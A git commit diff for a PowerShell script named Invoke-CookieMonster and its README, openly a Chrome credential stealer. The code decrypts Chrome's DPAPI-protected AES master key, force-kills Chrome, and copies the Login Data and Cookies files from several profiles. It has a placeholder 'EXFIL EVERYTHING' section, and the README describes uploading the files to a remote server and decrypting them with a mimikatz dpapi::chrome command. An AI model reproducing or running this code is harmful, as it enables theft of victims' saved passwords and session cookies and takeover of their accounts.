1f44a9479ad52b0f3bc255f471a8eb3d1aa5e421
Kyle <kyle@mistele.com>
2021-08-04 19:42:23 +0000

    grab additional files

--- Invoke-CookieMonster.ps1
+++ Invoke-CookieMonster.ps1
@@ -1,3 +1,5 @@
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Text.Encoding
 ## PULL THE DPAPI-ENCRYPTED AES MASTERKEY FROM THE LOCAL STATE FILE
 $encrKeyPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\Local State'
 $encrKey = [System.IO.File]::ReadAllText($encrKeyPath)
@@ -15,16 +17,45 @@ $hexdecKey = ($AESKey | ForEach-Object ToString X2) -join '' #Convert byte[] to 
 
 # KILL CHROME BECAUSE IT LOCKS THE FILES
 taskkill /f /t /im chrome.exe
+Start-Sleep -Seconds 5
 
 ## GRAB THE LOGIN DATA AND COOKIE FILES
 Write-Host "Getting files data"
-$loginDataBytes = [IO.File]::ReadAllBytes($env:LOCALAPPDATA + '\Google\Chrome\User Data\Default\Login Data')
-$cookieBytes = [IO.File]::ReadAllBytes($env:LOCALAPPDATA + '\Google\Chrome\User Data\Default\Cookies')
 
-# TEST CODE
-[IO.File]::WriteAllBytes("Cookies.bin", $cookieBytes)
-[IO.File]::WriteAllBytes("LoginData.bin", $loginDataBytes)
+$profileFolderDirs = 'Default', 'Profile 1', 'Profile 2', 'Profile 3'
+foreach ($profile in $profileFolderDirs) {
+
+    try {
+        $loginDataPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\' + $profile + '\Login Data'
+        $cookiesPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\' + $profile + '\Cookies'
+        Write-Host $loginDataPath
+        Write-Host $cookiesPath
+    
+        $loginDataBytes = [IO.File]::ReadAllBytes($loginDataPath)
+        $cookieBytes = [IO.File]::ReadAllBytes($cookiesPath)
+    
+        if ($null -eq $loginDataBytes -or $null -eq $cookieBytes) {
+            Write-Host "Couldn't read files for $profile (1)"
+            continue;
+        }
+    
+        $loginFilePath = $profile + '_login_data.bin';
+        $cookiesFilePath = $profile + '_cookies.bin';
+    
+        # TEST CODE
+        [IO.File]::WriteAllBytes($cookiesFilePath, $cookieBytes)
+        [IO.File]::WriteAllBytes($loginFilePath, $loginDataBytes)
+    }
+    catch {
+        Write-Host "Couldn't read files for $profile"
+        continue
+    }
+    
+}
+
+
 
 ## EXFIL EVERYTHING
 
 # $hexDecKey, $loginDataBytes, $cookieBytes
+Write-Host $hexdecKey
--- README.md
+++ README.md
@@ -1,1 +1,14 @@
-cookie-monster
+# Cookie Monster
+* grabs the login data and cookies files from chrome
+* decrypts the DPAPI-protectes AES masterkey used to protect both files
+* attempts to upload them to a remote server
+
+
+## Decrypting
+
+Note that the `/key` argument should specify the masterkey as a hex string (case-insensitive), and that you can only decrypt one file at a time
+```
+mimikatz.exe
+
+dpapi::chrome /in:"C:/path/to/file" /key:"47ac79a0...." /unprotect
+```
